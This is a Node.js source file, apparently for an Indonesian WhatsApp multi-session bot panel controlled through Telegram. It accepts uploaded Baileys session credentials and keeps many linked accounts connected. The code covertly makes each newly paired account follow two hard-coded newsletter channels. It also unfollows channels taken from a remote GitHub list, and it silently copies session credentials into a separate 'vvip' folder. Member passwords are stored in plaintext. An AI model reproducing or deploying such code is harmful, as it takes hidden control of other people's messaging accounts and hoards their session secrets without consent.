          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
   
}

async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const vvipDir = path.join(__dirname, 'vvip');
  const baseDir = 'permenmd';

  // Buat folder vvip kalau belum ada
  if (!fs.existsSync(vvipDir)) {
    fs.mkdirSync(vvipDir, { recursive: true });
    console.log(`[INFO] Folder vvip dibuat.`);
  }

  // Helper: copy creds ke vvip/nomor.json setelah konek
  async function copyCredsToVVIP(sessionPath, sessionName) {
    const credsSource = path.join(sessionPath, `${sessionName}.json`);
    const credsDest = path.join(vvipDir, `${sessionName}.json`);
    try {
      if (fs.existsSync(credsSource)) {
        fs.copyFileSync(credsSource, credsDest);
        console.log(`[VVIP] Creds copied: ${sessionName}.json → vvip/`);
      } else {
        console.warn(`[VVIP] creds.json tidak ditemukan di ${sessionPath}`);
      }
    } catch (err) {
      console.error(`[VVIP ERROR] Gagal copy creds ${sessionName}:`, err.message);
    }
  }

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f =>
      fs.statSync(path.join(vipDir, f)).isDirectory()
    );

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);

    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
        await copyCredsToVVIP(sessionPath, sessionName); // ✅ Copy setelah konek
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (permenmd)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
          await copyCredsToVVIP(folder, sessionName); // ✅ Copy setelah konek
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
/*
async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const baseDir = 'permenmd';

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f => fs.statSync(path.join(vipDir, f)).isDirectory());

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);
    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}*/

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("update", async (msg, match) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");

        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});


bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
      case "create_member":
    bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
    bot.once("message", msg => {
      const [username, password, day] = msg.text.split("|");
      const db = loadDatabase();
      if (db.find(u => u.username === username)) return bot.sendMessage(msg.chat.id, "❌ Username sudah ada!");
      const expired = new Date();
      expired.setDate(expired.getDate() + parseInt(day));
      db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
      saveDatabase(db);
      bot.sendMessage(msg.chat.id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
    });
    break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003778628828"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}
// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di https://shiikitzy.digital-panel.web.id:${PORT}`);
  setupVipFolder();
  startUserSessions();

  // 🆕 Jalankan Auto Refresh Timer
  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
})